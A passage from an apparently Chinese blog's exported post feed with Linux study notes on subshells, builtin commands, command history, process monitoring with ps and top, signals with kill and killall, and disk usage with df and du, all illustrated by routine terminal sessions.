-froot@VM-16-11-debian:~<span class="token comment"># bash  //创建子shell</span>root@VM-16-11-debian:~<span class="token comment"># bash  //子shell中创建子shell</span>root@VM-16-11-debian:~<span class="token comment"># bash</span>root@VM-16-11-debian:~<span class="token comment"># ps --forest</span>  PID TTY          TIME CMD <span class="token number">8068</span> pts/0    00:00:00 <span class="token function">bash</span><span class="token number">14850</span> pts/0    00:00:00  <span class="token punctuation">\</span>_ <span class="token function">bash</span><span class="token number">14858</span> pts/0    00:00:00      <span class="token punctuation">\</span>_ <span class="token function">bash</span><span class="token number">14861</span> pts/0    00:00:00          <span class="token punctuation">\</span>_ <span class="token function">bash</span><span class="token number">14994</span> pts/0    00:00:00              <span class="token punctuation">\</span>_ <span class="token function">ps</span>root@VM-16-11-debian:~<span class="token comment"># exit</span><span class="token builtin class-name">exit</span>  //exit退出shellroot@VM-16-11-debian:~<span class="token comment"># exit</span><span class="token builtin class-name">exit</span>root@VM-16-11-debian:~<span class="token comment"># exit</span><span class="token builtin class-name">exit</span>root@VM-16-11-debian:~<span class="token comment"># ps -f</span><span class="token environment constant">UID</span>        PID  <span class="token environment constant">PPID</span>  C STIME TTY          TIME CMDroot      <span class="token number">8068</span>  <span class="token number">8050</span>  <span class="token number">0</span> <span class="token number">19</span>:48 pts/0    00:00:00 -bashroot     <span class="token number">15204</span>  <span class="token number">8068</span>  <span class="token number">0</span> <span class="token number">20</span>:17 pts/0    00:00:00 <span class="token function">ps</span> -f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入命令bash之后，一个子shell就出现了。第二个ps -f是在子shell中执行的。可以从显示结果中看到有两个bash shell程序在运行。第一个bash shell程序，也就是父shell进程，其原始进程ID是1814。第二个bash shell程序， 即子shell进程，其PID是2430。注意，子shell的<strong>父进程ID（ PPID）是1841</strong>，指明了<strong>这个父shell进程就是该子shell的父进程</strong>。  </p><img src="E:\myblog\source\_posts\Linux学习-第五章.assets\5.1.png" style="zoom:150%;"><h4 id="5-2-1-进程列表"><a href="#5-2-1-进程列表" class="headerlink" title="5.2.1 进程列表"></a>5.2.1 进程列表</h4><p>命令之间加入分号（ ;）可以依次运行的一系列命令。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># pwd ; ls ; cd /etc ; pwd </span>/rootdisk.sh  install.sh  <span class="token function">mc</span>/etc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>不过这并不是进程列表。命令列表要想成为进程列表，这些命令<font color="#FF5E3A" size="3">必须包含在括号里</font>。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment">#(pwd ; ls ; cd /etc ; pwd )</span>/rootdisk.sh  install.sh  <span class="token function">mc</span>/etc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>虽然结果没有不同但是括号的加入使命令列表变成了进程列表，<font color="#FF5E3A" size="3">生成了一个子shell来执行对应的命令</font>。  </p><p>要想知道是否生成了子shell，得<strong>借助一个使用了环境变量的命令</strong>。（环境变量会在第6章中详述。）这个命令就是<code>echo $BASH_SUBSHELL</code>。如果该命令返回0，就表明没有子shell。如果返回<strong>1或者其他更大的数字</strong>，就表明存在子shell。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># (pwd ; ls ; cd /etc ; pwd; echo $BASH_SUBSHELL)</span>/rootdisk.sh  install.sh  <span class="token function">mc</span>/etc<span class="token number">1</span><span class="token comment">#嵌套</span>$ <span class="token punctuation">(</span> <span class="token builtin class-name">pwd</span> <span class="token punctuation">;</span> <span class="token punctuation">(</span>echo <span class="token variable">$BASH_SUBSHELL</span><span class="token punctuation">))</span>/home/Christine<span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在shell脚本中，经常使用子shell进行多进程处理。但是采用子shell的成本不菲，会明显拖慢处理速度。在交互式的CLI shell会话中，子shell同样存在问题。它<strong>并非真正的多进程处理</strong>，因为终端控制着子shell的I/O。  </p><h3 id="5-3-理解-shell-的内建命令"><a href="#5-3-理解-shell-的内建命令" class="headerlink" title="5.3 理解 shell 的内建命令"></a>5.3 理解 shell 的内建命令</h3><h4 id="5-3-1-外部命令-非内建命令"><a href="#5-3-1-外部命令-非内建命令" class="headerlink" title="5.3.1 外部命令 (非内建命令)"></a>5.3.1 外部命令 (非内建命令)</h4><p>外部命令，有时候也被称为<strong>文件系统命令</strong>，是<strong>存在于bash shell之外的程序</strong>。它们并不是shell程序的一部分。外部命令程序通常位于/bin、 /usr/bin、 /sbin或/usr/sbin中。<br>ps就是一个外部命令。你可以使用which和type命令找到它。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># which ps</span>/usr/bin/ps<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><font color="#FF5E3A" size="3">当外部命令执行时，会创建出一个子进程</font>。这种操作被称为衍生（ forking）。外部命令ps很方便显示出它的父进程以及自己所对应的衍生子进程。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># ps -f</span><span class="token environment constant">UID</span>        PID  <span class="token environment constant">PPID</span>  C STIME TTY          TIME CMDroot     <span class="token number">10004</span>  <span class="token number">9998</span>  <span class="token number">0</span> <span class="token number">15</span>:09 pts/1    00:00:00 -bashroot     <span class="token number">11078</span> <span class="token number">10004</span>  <span class="token number">0</span> <span class="token number">15</span>:13 pts/1    00:00:00 <span class="token function">ps</span> -f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux5/202202051550062.png" alt="外部命令执行时的衍生过程"></p><h4 id="5-3-2-内建命令"><a href="#5-3-2-内建命令" class="headerlink" title="5.3.2 内建命令"></a>5.3.2 内建命令</h4><p>内建命令和外部命令的区别在于前者不需要使用子进程来执行。<font color="#FF5E3A" size="3">它们已经和shell编译成了一体，作为shell工具的组成部分存在</font>。不需要借助外部程序文件来运行。  </p><p><code>cd</code>和<code>exit</code>命令都内建于bash shell。可以<font color="#FF5E3A" size="3">利用<code>type</code>命令来了解某个命令是否是内建的</font>。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># type cd</span><span class="token builtin class-name">cd</span> is a shell <span class="token builtin class-name">builtin</span>root@VM-16-11-debian:~<span class="token comment"># type exit</span><span class="token builtin class-name">exit</span> is a shell <span class="token builtin class-name">builtin</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>有些命令有多种实现。例如echo和pwd既有内建命令也有外部命令。两种实现略有不同。要查看命令的不同实现，使用type命令的<code>-a</code>选项。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">type</span> -a <span class="token builtin class-name">echo</span><span class="token builtin class-name">echo</span> is a shell <span class="token builtin class-name">builtin</span><span class="token builtin class-name">echo</span> is /bin/echo$$ <span class="token function">which</span> <span class="token builtin class-name">echo</span>/bin/echo$$ <span class="token builtin class-name">type</span> -a <span class="token builtin class-name">pwd</span><span class="token builtin class-name">pwd</span> is a shell <span class="token builtin class-name">builtin</span><span class="token builtin class-name">pwd</span> is /bin/pwd$$ <span class="token function">which</span> <span class="token builtin class-name">pwd</span>/bin/pwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>which</code>命令<strong>只显示出了外部命令文件</strong>。  </p><h5 id="5-3-2-1-使用history命令"><a href="#5-3-2-1-使用history命令" class="headerlink" title="5.3.2.1 使用history命令"></a>5.3.2.1 使用history命令</h5><p>一个有用的内建命令是<code>history</code>命令。 bash shell会跟踪你用过的命令。你可以唤回这些命令并重新使用。  </p><p>查看最近用过的命令列表，可以输入不带选项的history命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">history</span><span class="token number">1</span> <span class="token function">ps</span> -f<span class="token number">2</span> <span class="token builtin class-name">pwd</span><span class="token number">3</span> <span class="token function">ls</span><span class="token number">4</span> coproc <span class="token punctuation">(</span> <span class="token function">sleep</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token function">sleep</span> <span class="token number">2</span> <span class="token punctuation">)</span><span class="token number">5</span> <span class="token function">jobs</span><span class="token number">6</span> <span class="token function">ps</span> --forest<span class="token number">7</span> <span class="token function">ls</span><span class="token number">8</span> <span class="token function">ps</span> -f<span class="token number">9</span> <span class="token builtin class-name">pwd</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通常历史记录中会保存最近的1000条命令。  不同的系统配置可能不一样，可以通过<code>HISTSIZE</code>环境变量查看：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># echo $HISTSIZE</span><span class="token number">3000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>输入<code>!!</code>，然后按回车键就能够唤出刚刚用过的那条命令来使用:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># ps</span>  PID TTY          TIME CMD<span class="token number">17661</span> pts/2    00:00:00 <span class="token function">bash</span><span class="token number">18051</span> pts/2    00:00:00 <span class="token function">ps</span>root@VM-16-11-debian:~<span class="token comment"># !!</span><span class="token function">ps</span>  PID TTY          TIME CMD<span class="token number">17661</span> pts/2    00:00:00 <span class="token function">bash</span><span class="token number">18063</span> pts/2    00:00:00 <span class="token function">ps</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当输入!!时， bash首先会显示出从shell的历史记录中唤回的命令。然后执行该命令。  </p><p>命令历史记录被保存在隐藏文件.bash_history中，它位于用户的主目录中。这里要注意的是，<font color="#FF5E3A" size="3">bash命令的历史记录是先存放在内存中，当shell退出时才被写入到历史文件中</font>。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">history</span><span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span><span class="token number">25</span> <span class="token function">ps</span> --forest<span class="token number">26</span> <span class="token function">history</span><span class="token number">27</span> <span class="token function">ps</span> --forest<span class="token number">28</span> <span class="token function">history</span>$$ <span class="token function">cat</span> .bash_history<span class="token builtin class-name">pwd</span><span class="token function">ls</span><span class="token function">history</span><span class="token builtin class-name">exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以唤回历史列表中任意一条命令。只需输入感叹号（!）和命令在历史列表中的编号即可。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">history</span><span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span><span class="token number">16</span> <span class="token builtin class-name">type</span> <span class="token builtin class-name">pwd</span><span class="token number">17</span> <span class="token function">which</span> <span class="token builtin class-name">pwd</span><span class="token number">18</span> <span class="token builtin class-name">type</span> <span class="token builtin class-name">echo</span><span class="token number">19</span> <span class="token function">which</span> <span class="token builtin class-name">echo</span><span class="token number">20</span> <span class="token builtin class-name">type</span> -a <span class="token builtin class-name">pwd</span><span class="token number">21</span> <span class="token builtin class-name">type</span> -a <span class="token builtin class-name">echo</span><span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span><span class="token number">32</span> <span class="token function">history</span> -a<span class="token number">33</span> <span class="token function">history</span>$ <span class="token operator">!</span><span class="token number">20</span><span class="token builtin class-name">type</span> -a <span class="token builtin class-name">pwd</span><span class="token builtin class-name">pwd</span> is a shell <span class="token builtin class-name">builtin</span><span class="token builtin class-name">pwd</span> is /bin/pwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p><font color="#FF9999" size="3">文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)</font></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux5/202202051442832.jpg" style="zoom:150%;">]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习-第四章</title>
      <link href="/posts/myh10010.html"/>
      <url>/posts/myh10010.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第四章：进阶bash-shell命令"><a href="#第四章：进阶bash-shell命令" class="headerlink" title="第四章：进阶bash shell命令"></a>第四章：进阶bash shell命令</h2><h3 id="4-1-监测程序"><a href="#4-1-监测程序" class="headerlink" title="4.1 监测程序"></a>4.1 监测程序</h3><h4 id="4-1-1-探查进程"><a href="#4-1-1-探查进程" class="headerlink" title="4.1.1 探查进程"></a>4.1.1 探查进程</h4><p>在讲探查进程之前先说明一下什么是进程。<font color="#FF5E3A" size="3">进程：运行在系统上的程序。</font>要监测这些进程，需要熟悉<code>ps命令</code>的用法。 ps命令好比工具中的瑞士军刀，它能输出运行在系统上的所有程序的许多信息。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># ps</span>  PID TTY          TIME CMD<span class="token number">26084</span> pts/0    00:00:00 <span class="token function">bash</span><span class="token number">26098</span> pts/0    00:00:00 <span class="token function">ps</span><span class="token comment">#PID : Process ID,显示了当前程序的进程ID</span><span class="token comment">#TTY : 属于哪个终端</span><span class="token comment">#TIME: 运行的时长</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>默认情况下， ps命令只会显示运行在当前控制台下的属于当前用户的进程。  此例我们只运行了bash shell（注意， <font color="#FF5E3A" size="3">shell也只是运行在系统上的另一个程序而已</font>）以及ps命令本身。  下面讲解一下<code>ps</code>命令对应的部分参数及其作用:</p><table><thead><tr><th align="center">参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">-A</td><td align="center">显示所有进程</td></tr><tr><td align="center">-N</td><td align="center">显示与指定参数<font color="#FF5E3A" size="3">不符</font>的所有进程</td></tr><tr><td align="center">-a</td><td align="center">显示除控制进程（ session leader）和无终端进程外的所有进程</td></tr><tr><td align="center">-d</td><td align="center">显示除控制进程外的所有进程</td></tr><tr><td align="center">-e</td><td align="center">显示所有进程</td></tr><tr><td align="center">-c</td><td align="center">显示进程的额外调度器信息</td></tr><tr><td align="center">-f</td><td align="center">显示完整格式的输出</td></tr><tr><td align="center">-l</td><td align="center">显示长列表</td></tr></tbody></table><p>命令参数还有很多，也不需要都记住，只需要记住最常用的就好。经常把参数组合起来用是不错的方法，比如<code>-ef</code>命令，可以查看系统上运行的所有进程并且显示一些经常需要的信息：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># ps -ef</span><span class="token environment constant">UID</span>        PID  <span class="token environment constant">PPID</span>  C STIME TTY          TIME CMDroot         <span class="token number">1</span>     <span class="token number">0</span>  <span class="token number">0</span> Jan21 ?        00:00:02 /sbin/initroot         <span class="token number">2</span>     <span class="token number">0</span>  <span class="token number">0</span> Jan21 ?        00:00:00 <span class="token punctuation">[</span>kthreadd<span class="token punctuation">]</span>root         <span class="token number">3</span>     <span class="token number">2</span>  <span class="token number">0</span> Jan21 ?        00:00:00 <span class="token punctuation">[</span>rcu_gp<span class="token punctuation">]</span>root         <span class="token number">4</span>     <span class="token number">2</span>  <span class="token number">0</span> Jan21 ?        00:00:00 <span class="token punctuation">[</span>rcu_par_gp<span class="token punctuation">]</span>root         <span class="token number">6</span>     <span class="token number">2</span>  <span class="token number">0</span> Jan21 ?        00:00:00 <span class="token punctuation">[</span>kworker/0:0H-kblockd<span class="token punctuation">]</span>root         <span class="token number">7</span>     <span class="token number">2</span>  <span class="token number">0</span> Jan21 ?        00:00:00 <span class="token punctuation">[</span>kworker/u4:0-events_unbound<span class="token punctuation">]</span>root         <span class="token number">8</span>     <span class="token number">2</span>  <span class="token number">0</span> Jan21 ?        00:00:00 <span class="token punctuation">[</span>mm_percpu_wq<span class="token punctuation">]</span>root         <span class="token number">9</span>     <span class="token number">2</span>  <span class="token number">0</span> Jan21 ?        00:00:01 <span class="token punctuation">[</span>ksoftirqd/0<span class="token punctuation">]</span>root        <span class="token number">10</span>     <span class="token number">2</span>  <span class="token number">0</span> Jan21 ?        00:00:29 <span class="token punctuation">[</span>rcu_sched<span class="token punctuation">]</span>root        <span class="token number">11</span>     <span class="token number">2</span>  <span class="token number">0</span> Jan21 ?        00:00:00 <span class="token punctuation">[</span>rcu_bh<span class="token punctuation">]</span>……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li> UID：启动这些进程的用户。</li><li> PID：进程的进程ID。</li><li> PPID：父进程的进程号（如果该进程是由另一个进程启动的）。</li><li> C：进程生命周期中的CPU利用率。</li><li> STIME：进程启动时的系统时间。</li><li> TTY：进程启动时的终端设备。</li><li> TIME：运行进程需要的累计CPU时间。</li><li> CMD：启动的程序名称  </li></ul><p>如果需要更多信息使用<code>-l</code>参数，也可以结合使用：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># ps -le</span>F S   <span class="token environment constant">UID</span>   PID  <span class="token environment constant">PPID</span>  C PRI  NI ADDR SZ WCHAN  TTY          TIME CMD<span class="token number">4</span> S     <span class="token number">0</span>     <span class="token number">1</span>     <span class="token number">0</span>  <span class="token number">0</span>  <span class="token number">80</span>   <span class="token number">0</span> - <span class="token number">26326</span> do_epo ?        00:00:02 systemd<span class="token number">1</span> S     <span class="token number">0</span>     <span class="token number">2</span>     <span class="token number">0</span>  <span class="token number">0</span>  <span class="token number">80</span>   <span class="token number">0</span> -     <span class="token number">0</span> -      ?        00:00:00 kthreadd<span class="token number">1</span> I     <span class="token number">0</span>     <span class="token number">3</span>     <span class="token number">2</span>  <span class="token number">0</span>  <span class="token number">60</span> -20 -     <span class="token number">0</span> -      ?        00:00:00 rcu_gp<span class="token number">1</span> I     <span class="token number">0</span>     <span class="token number">4</span>     <span class="token number">2</span>  <span class="token number">0</span>  <span class="token number">60</span> -20 -     <span class="token number">0</span> -      ?        00:00:00 rcu_par_gp<span class="token number">1</span> I     <span class="token number">0</span>     <span class="token number">6</span>     <span class="token number">2</span>  <span class="token number">0</span>  <span class="token number">60</span> -20 -     <span class="token number">0</span> -      ?        00:00:00 kworker/0:0H-kblockd<span class="token number">1</span> I     <span class="token number">0</span>     <span class="token number">7</span>     <span class="token number">2</span>  <span class="token number">0</span>  <span class="token number">80</span>   <span class="token number">0</span> -     <span class="token number">0</span> -      ?        00:00:00 kworker/u4:0-events_unbound<span class="token number">1</span> I     <span class="token number">0</span>     <span class="token number">8</span>     <span class="token number">2</span>  <span class="token number">0</span>  <span class="token number">60</span> -20 -     <span class="token number">0</span> -      ?        00:00:00 mm_percpu_wq<span class="token number">1</span> S     <span class="token number">0</span>     <span class="token number">9</span>     <span class="token number">2</span>  <span class="token number">0</span>  <span class="token number">80</span>   <span class="token number">0</span> -     <span class="token number">0</span> -      ?        00:00:01 ksoftirqd/0<span class="token number">1</span> I     <span class="token number">0</span>    <span class="token number">10</span>     <span class="token number">2</span>  <span class="token number">0</span>  <span class="token number">80</span>   <span class="token number">0</span> -     <span class="token number">0</span> -      ?        00:00:29 rcu_sched<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li> F：内核分配给进程的系统标记。</li><li> S：进程的状态（ O代表正在运行； S代表在休眠； R代表可运行，正等待运行； Z代表僵化，进程已结束但父进程已不存在； T代表停止）。</li><li> PRI：进程的优先级（越大的数字代表越低的优先级）。</li><li> NI：谦让度值用来参与决定优先级。</li><li> ADDR：进程的内存地址。</li><li> SZ：假如进程被换出，所需交换空间的大致大小。</li><li> WCHAN：进程休眠的内核函数的地址。 </li></ul><h4 id="4-1-2-实时探测进程"><a href="#4-1-2-实时探测进程" class="headerlink" title="4.1.2 实时探测进程"></a>4.1.2 实时探测进程</h4><p>ps命令虽然在收集运行在系统上的进程信息时非常有用，但也有不足之处：它只能显示某个特定时间 。如果想观察那些频繁换进换出的内存的进程趋势，用ps命令就不方便了。  <code>top</code>命令刚好适用这种情况。 top命令跟ps命令相似，能够显示进程信息，但它是实时显的。  </p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux4/202201221838032.png"></p><p>输出的第一部分显示的是<font color="#FF5E3A" size="3">系统的概况</font>：第一行显示了当前时间、系统的运行时间、登录的用户数以及系统的平均负载。平均负载有3个值：最近1分钟的、最近5分钟的和最近15分钟的平均负载。值越大说明系统的负载越高。由于进程短期的突发性活动，出现最近1分钟的高负载值也很常见，但如果<strong>近15分钟内的平均负载都很高，就说明系统可能有问题</strong>。  </p><hr><p>说明:Linux系统管理的要点在于定义究竟到什么程度才算是高负载。这个值取决于系统的硬件配置以及系统上通常运行的程序。对某个系统来说是高负载的值可能对另一系统来说就是正常值。通常，如果系统的<strong>负载值超过了2</strong>，就说明系统比较繁忙了。  </p><hr><p>第二行显示了进程概要信息——<font color="#FF5E3A" size="3">top命令的输出中将进程叫作任务（ task）</font>：有多少进程处在运行、休眠、停止或是僵化状态（僵化状态是指进程完成了，但父进程没有响应）。  </p><p>第三行显示了<font color="#FF5E3A" size="3">CPU的概要信息</font>。 top根据进程的属主（用户还是系统）和进程的状态（运行、空闲还是等待）将CPU利用率分成几类输出。 </p><p>紧跟其后的两行说明了<font color="#FF5E3A" size="3">系统内存的状态</font>。第一行说的是系统的物理内存：总共有多少内存，当前用了多少，还有多少空闲。后一行说的是同样的信息，不过是针对系统交换空间（如果分配了的话）的状态而言的。   </p><p>后一部分显示了当前运行中的进程的详细列表，有些列跟ps命令的输出类似：</p><ul><li> PID：进程的ID。</li><li> USER：进程属主的名字。</li><li> PR：进程的优先级。</li><li> NI：进程的谦让度值。</li><li> VIRT：进程占用的虚拟内存总量。</li><li> RES：进程占用的物理内存总量。</li><li> SHR：进程和其他进程共享的内存总量。</li><li> S：进程的状态（ D代表可中断的休眠状态， R代表在运行状态， S代表休眠状态， T代表跟踪状态或停止状态， Z代表僵化状态，<code>I</code>代表空闲的任务（进程），这是比较新版的内核中新增的状态。）</li><li> %CPU：进程使用的CPU时间比例。</li><li> %MEM：进程使用的内存占可用内存的比例。  </li><li> TIME+：自进程启动到目前为止的CPU时间总量。  </li><li> COMMAND：进程所对应的命令行名称，也就是启动的程序名。  </li></ul><p>在top命令运行时键入可改变top的行为。键入f允许你选择对输出进行排序的字段，键入d允许你修改轮询间隔。<strong>键入q可以退出top</strong>。  </p><h4 id="4-1-3-结束进程"><a href="#4-1-3-结束进程" class="headerlink" title="4.1.3 结束进程"></a>4.1.3 结束进程</h4><p>有时进程挂起了，只需要动动手让进程重新运行或结束就行了。但有时，有的进程会耗尽CPU且不释放资源。在这两种情景下，你就需要能控制进程的命令。 Linux沿用了Unix进行<font color="#FF5E3A" size="3">进程间通信的方法</font>。 在Linux中，<font color="#FF5E3A" size="3">进程之间通过信号来通信</font>。进程的信号就是预定义好的一个消息，<font color="#FF5E3A" size="3">进程能识别它并决定忽略还是作出反应</font>。进程如何处理信号是由开发人员通过编程来决定的。大多数编写完善的程序都能接收和处理标准Unix进程信号。   </p><table><thead><tr><th align="center">信号</th><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">HUP</td><td align="center">挂起</td></tr><tr><td align="center">2</td><td align="center">INT</td><td align="center">中断</td></tr><tr><td align="center">3</td><td align="center">QUIT</td><td align="center">结束运行</td></tr><tr><td align="center">9</td><td align="center">KILL</td><td align="center">无条件终止</td></tr><tr><td align="center">11</td><td align="center">SEGV</td><td align="center">段错误</td></tr><tr><td align="center">15</td><td align="center">TERM</td><td align="center">尽可能终止</td></tr><tr><td align="center">17</td><td align="center">STOP</td><td align="center">无条件停止运行，但不终止</td></tr><tr><td align="center">18</td><td align="center">TSTP</td><td align="center">停止或暂停，但继续在后台运行</td></tr><tr><td align="center">19</td><td align="center">CONT</td><td align="center">在STOP或TSTP之后恢复执行</td></tr></tbody></table><p><code>kill命令</code> ：</p><p>要发送进程信号，你<font color="#FF5E3A" size="3">必须是进程的属主或登录为root用户</font>。  kill命令可通过进程ID（ PID）给进程发信号。默认情况下， kill命令会向命令行中列出的全部PID发送一个TERM信号。遗憾的是，你只能用进程的PID而不能用命令名，所以kill命令有时并不好用。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">kill</span> <span class="token number">3940</span>-bash: kill: <span class="token punctuation">(</span><span class="token number">3940</span><span class="token punctuation">)</span> - Operation not permitted$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>TERM信号告诉进程可能的话就停止运行。不过，如果有不服管教的进程，那它通常<strong>会忽略这个请求</strong>。如果要强制终止， -s参数支持指定其他信号（用信号名或信号值）。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># kill -s HUP 3940</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以看出kill命令不会有任何输出。 要<strong>检查kill命令是否有效，可再运行ps或top命令</strong>，看看问题进程是否已停止。 </p><p><code>killall</code>命令：</p><p>killall命令支持通过进程名而不是PID来结束进程。 killall命令也支持通配符，这在系统因负载过大而变得很慢时很有用。   </p><hr><p><font color="red" size="3">警告</font> 以root用户身份登录系统时，使用killall命令要特别小心，因为很容易就会误用通配符而结束了重要的系统进程。这可能会破坏文件系统。</p><hr><h3 id="4-2-监测磁盘空间"><a href="#4-2-监测磁盘空间" class="headerlink" title="4.2 监测磁盘空间"></a>4.2 监测磁盘空间</h3><h4 id="4-2-1-df-命令"><a href="#4-2-1-df-命令" class="headerlink" title="4.2.1 df 命令"></a>4.2.1 <code>df </code>命令</h4><p>df命令可以方便地查看所有<strong>已挂载磁盘</strong>的使用情况。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">df</span>Filesystem     1K-blocks    Used Available Use% Mounted onudev             <span class="token number">1939124</span>       <span class="token number">0</span>   <span class="token number">1939124</span>   <span class="token number">0</span>% /devtmpfs             <span class="token number">391044</span>   <span class="token number">39556</span>    <span class="token number">351488</span>  <span class="token number">11</span>% /run/dev/vda1       <span class="token number">82503044</span> <span class="token number">5996440</span>  <span class="token number">73051148</span>   <span class="token number">8</span>% /tmpfs            <span class="token number">1955208</span>      <span class="token number">32</span>   <span class="token number">1955176</span>   <span class="token number">1</span>% /dev/shm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li> 设备的设备文件位置；</li><li> 能容纳多少个1024字节大小的块；</li><li> 已用了多少个1024字节大小的块；</li><li> 还有多少个1024字节大小的块可用；</li><li> 已用空间所占的比例；</li><li> 设备挂载到了哪个挂载点上  </li></ul><p>一个常用的参数是<code>-h</code>。它会把输出中的磁盘空间按照用户易读的形式显示，通常用M来替代兆字节，用G替代吉字节。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">df</span> -hFilesystem      Size  Used Avail Use% Mounted onudev            <span class="token number">1</span>.9G     <span class="token number">0</span>  <span class="token number">1</span>.9G   <span class="token number">0</span>% /devtmpfs           382M   39M  344M  <span class="token number">11</span>% /run/dev/vda1        79G  <span class="token number">5</span>.8G   70G   <span class="token number">8</span>% /tmpfs           <span class="token number">1</span>.9G   32K  <span class="token number">1</span>.9G   <span class="token number">1</span>% /dev/shm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-2-2-du命令"><a href="#4-2-2-du命令" class="headerlink" title="4.2.2 du命令"></a>4.2.2 <code>du</code>命令</h4><p>du命令可以显示某个特定目录（默认情况下是当前目录）的磁盘使用情况。这一方法可用来快速判断系统上某个目录下是不是有超大文件。  </p><p>默认情况下， du命令会显示当前目录下所有的文件、目录和子目录的磁盘使用情况，它会以磁盘块为单位来表明每个文件或目录占用了多大存储空间。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">du</span><span class="token number">484</span> ./.gstreamer-0.10<span class="token number">8</span> ./Templates<span class="token number">8</span> ./Download<span class="token number">8</span> ./.ccache/7/0<span class="token number">24</span> ./.ccache/7<span class="token number">368</span> ./.ccache/a/d<span class="token number">384</span> ./.ccache/a<span class="token number">424</span> ./.ccache<span aria-hidden="true" 